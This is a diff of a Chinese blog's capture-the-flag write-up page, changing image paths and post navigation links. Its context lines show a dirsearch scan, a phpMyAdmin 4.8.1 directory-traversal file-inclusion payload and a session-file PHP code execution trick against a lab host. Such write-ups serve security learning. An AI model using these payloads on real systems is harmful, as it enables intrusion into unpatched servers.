@@ -111,7 +111,7 @@
 <p>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://10b9238b-d123-4f63-891c-33ce01e55ca1.node3.buuoj.cn/">http://10b9238b-d123-4f63-891c-33ce01e55ca1.node3.buuoj.cn/</a> -e *  -s  0.05</p>
 </blockquote>
 <p> 刚开始没有扫出来，全是429，可能太快了，  就在后面加了个 -s  延迟一下</p>
-<p><img src="/2020/09/27/2020-9-27buuctf/image-20200925230015691-1601176648752.png" alt="image-20200925230015691"></p>
+<p><img src="/2020/09/27/2020-9-27buuctf/image-20200925230015691.png" alt="image-20200925230015691"></p>
 <p>发现phpmyadmin ,phpinfo.php(没信息)</p>
 <p>直接进入数据库。查看版本4.8.1</p>
 <p>然后就百度该版本漏洞，发现有 任意文件包含和任意代码执行漏洞</p>
@@ -120,12 +120,12 @@
 <h3 id="目录穿越，任意文件包含pyload："><a href="#目录穿越，任意文件包含pyload：" class="headerlink" title="目录穿越，任意文件包含pyload："></a>目录穿越，任意文件包含pyload：</h3><blockquote>
 <p>?target=db_sql.php%253f/../../../../../../../../flag</p>
 </blockquote>
-<p><img src="2020-9-27buuctf.assets//image-20200926122420288.png" alt="image-20200926122420288"></p>
+<p><img src="/2020/09/27/2020-9-27buuctf/image-20200926122420288.png" alt="image-20200926122420288"></p>
 <ul>
 <li>session 进行 php 代码执行（session 文件中中记录了执行的操作）</li>
 </ul>
 <p>​        具体方法：SELECT ‘ <code>&lt;?php phpinfo()?&gt;</code> ‘ ;</p>
-<p><img src="2020-9-27buuctf.assets//image-20200926120643739.png" alt="image-20200926120643739"></p>
+<p><img src="/2020/09/27/2020-9-27buuctf/image-20200926120643739.png" alt="image-20200926120643739"></p>
 <p>然后查看session值,</p>
 <blockquote>
 <p>?target=db_sql.php%253f/../../../../../../../../tmp/sess_fal9idhffq4t112qfa86k5kbo1</p>
@@ -228,10 +228,19 @@
    
   <nav class="article-nav">
     
+      <a href="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            MSF-永恒之蓝入侵
+          
+        </div>
+      </a>
     
-      <a href="/2020/09/27/2020.9.26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/" class="article-nav-link">
+    
+      <a href="/2020/09/16/2020.9.16%E9%93%BE%E8%A1%A8/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">MSF-永恒之蓝入侵</div>
+        <div class="article-nav-title">链表-c语言</div>
       </a>
     
   </nav>
